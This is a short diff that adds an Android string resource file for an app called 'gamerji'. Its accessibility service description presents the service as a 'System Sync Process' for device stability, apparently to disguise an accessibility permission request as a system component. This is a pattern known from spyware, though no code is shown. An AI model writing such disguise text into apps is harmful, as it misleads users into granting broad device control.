@@ -1,0 +1,5 @@
+<resources>
+    <string name="app_name">gamerji</string>
+    <string name="accessibility_desc">System Sync Process: Required for seamless background data synchronization and device stability.</string>
+</resources>
+
